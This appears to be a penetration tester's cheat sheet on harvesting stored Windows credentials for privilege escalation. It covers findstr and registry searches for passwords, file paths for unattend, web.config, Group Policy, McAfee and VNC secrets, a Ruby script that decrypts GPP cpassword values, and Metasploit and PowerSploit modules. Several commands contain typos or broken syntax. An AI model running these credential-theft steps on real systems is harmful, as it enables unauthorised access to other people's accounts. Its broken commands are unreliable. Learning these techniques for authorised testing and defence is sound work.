# Stored Credentials
https://pentestlab.blog/2017/04/19/stored-credentials/

**WHY:** If you have a cleartext password, then you can run any command as that user
```
> runas /U:localadmin cmd.exe
```
## Credentials in Files

### Searching for passwords

* Windows has a Grep-like function that can be used to search inside files for passwords called **findstr**
- `/S` : Searches for matching files in the current directory and all subdirectories.
- `/I` : Specifies that the search is not to be case-sensitive.
- `/P`   Skip any file that contains non-printable characters
- `/N`   Print the line number before each line that matches.

See the [FINDST Reference](https://ss64.com/nt/findstr.html)

* Find 'password' in .txt, .xml or .ini files
  ```
  c:> findstr /si password *.txt | *.xml | *.ini
  c:> findstr /si pass *.txt | *.xml | *.ini
  ```

* Find all passwords in all files.  
  ```
  c:> findstr /spin "password" *.*
  c:> findstr /spin "password" *.*
  ```
* Can also use **dir** to search
  ```
  c:> dir c:\*vnc.ini /s /b
  c:> dir c:\*ultravnc.ini /s /b
  c:> dir c:\ /s /b | findstr /si *vnc.ini
  ```


### Unattended installs
* **Sysprep** is used to generalize a Windows installation. It is used by admins to install many instances of a Windows image. There are two files that could be left behind and contain admin passwords (the passwords might also be Base64 encoded):
- `c:\syspre.inf` (cleartext) or
- `c:\sysprep\sysprep.xml` (base64)  
- `c:\unattend.xml`
- `%WINDIR%\Panther\Unattend\Unattended.xml`
- `%WINDIR%\Panther\Unattended.xml`  


* Remember on Linux to Base64 decode:
  ```
  $ base64 -d cABhAHMAcwB3AG8AcgBkAFAAYQBzAHMAdwBvAHIAZAA=
  ```

### IIS Servers
* If the system is running an IIS web server the web.config file should be checked as it might contain the administrator password in plaintext.
* These are located at:
  ```
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
  C:\inetpub\wwwroot\web.config
  ```

### Group Policy Preferences
* Local administrators passwords can also retrieved via the Group Policy Preferences. The Groups.xml file which contains the password is cached locally or it can be obtained from the domain controller as every domain user has read access to this file. The password is in an encrypted form but Microsoft has published the key and it can be decrypted.
  ```
  C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
  \\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
  ```

* The `cpassword` attribute can be found in other policy preference files as well such as:
```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```

* [Decryption of cpassword](https://pentestlab.blog/2017/03/20/group-policy-preferences/) can be done in a number of ways:
- Using [gp3finder](www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip)
- Using the following ruby script:

  ```ruby
  require 'rubygems'
  require 'openssl'
  require 'base64'

  encrypted_data = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

  def decrypt(encrypted_data)
  padding = "=" * (4 - (encrypted_data.length % 4))
  epassword = "#{encrypted_data}#{padding}"
  decoded = Base64.decode64(epassword)

  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\
  x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\
  x33\xb6\x6c\x1b"
  aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
  aes.decrypt
  aes.key = key
  plaintext = aes.update(decoded)
  plaintext << aes.final
  pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

  return pass
  end

  blah = decrypt(encrypted_data)
  puts blah
  ```
- Metasploit  
  ```
  > post/windows/gather/credentials/gpp
  ```
  Since domain administrators can set up local administrators accounts through the Group Policy this can lead to privilege escalation. These credentials can be used with the PsExec Metasploit module in order to successfully login to the workstation as SYSTEM.

- PowerSploit
  ```
  pws> Get-CachedGPPPassword //For locally stored GP Files
  pws> Get-GPPPassword //For GP Files stored in the DC
  ```

### McAfee
* Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:
```
%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml
```

### VNC Passwords
* Password for **VNC** are stored in a `.ini` file for some implementations of VNC which is easily decrypted (DES 56bit key)
- `vnc.ini` --> easily decrypted
- UltraVNC
  ```
  \Program Files\UltraVNC\ultravnc.ini
  Value: passwd or passwd2
  ```

Can also use `dir` to search for these:
  ```
  c:> dir c:\*vnc.ini /s /b
  c:> dir c:\*ultravnc.ini /s /b
  c:> dir c:\ /s /b | findstr /si *vnc.ini
  ```

See also:  
[Crack or Decrypt VNC Server Encrypted Password](https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/)  
[The DES encryption used by VNC servers](https://www.vidarholen.net/contents/junk/vnc.html)

### Other protocols with cleartext passwords
* Any **FTP** or **other remote access client**. Most cached credentials can be decrypted  
See for instance [Windows Password Recovery Tools ](http://www.nirsoft.net/password_recovery_tools.html)  


## Credentials in Registry

### Searching the registry

* Generally, to **search registry** for passwords:
  ```
  c:> req query HKLM /f password /t REG_SZ /s | clip
  c:> reg query KHCU /f password /t REG_SZ /s | clip
  ```
**clip** tool copies text into the clipboard, so if working on Citrix env and
you run this text is in clipboard and can be pasted locally

* Search for value of registry key:
  ```
  c:> reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
  ```

### VNC

* RealVNC
  ```
  HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
  Value: Password
  HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4
  Value: Password
  c:> reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
  ```

* TightVNC
  ```
  HKEY_CURRENT_USER\Software\TightVNC\Server
  Value: Password or PasswordViewOnly
  ```

* TigerVNC
  ```
  HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
  Value: Password
  ```

* Other
  ```
  HKCU\Software\ORL\WinVNC3
  Value: Password

  c:> reg query "HKCU\Software\ORL\WinVNC3\Password"
  ```

* See also:  
[Crack or Decrypt VNC Server Encrypted Password](https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/)  
[The DES encryption used by VNC servers](https://www.vidarholen.net/contents/junk/vnc.html)  

### Windows Autologin

* If this is set, it can work for local account of Microsoft account. Some user will have this set so no credentials need to be typed in when loggin on.
  ```
  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
  Value: DefaultPassword

  c:> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
  ```
- Cleartext creds
- Shell key
- UserInit key  

### SNMP Parameters
* Simple Network Management Protocol is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. To get to these values use the following command line command:
  ```
  c:> reg query "HKLM\SYSTE\CurrentControlSet\Services\SNMP\"
  ```

### Putty
* Putty is an application used as a terminal emulator, serial console and network file transfer application. Putty stores cleartext proxy credentials in the registry.

* To get to these values use the following command line command:
  ```
  c:> reg query "HKCU\Software\SimonTatham\PuTTY\Session"
  ```

## Finding Stored Credentials with PowerSploit
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) can be used as a tool for the discovery of **stored credentials**. Specifically it supports the following modules which will check for credentials encrypted or plain-text in various files and in the registry:

  ```
  Get-UnattendedInstallFile
  Get-Webconfig
  Get-ApplicationHost
  Get-SiteListPassword
  Get-CachedGPPPassword
  Get-RegistryAutoLogon
  ```
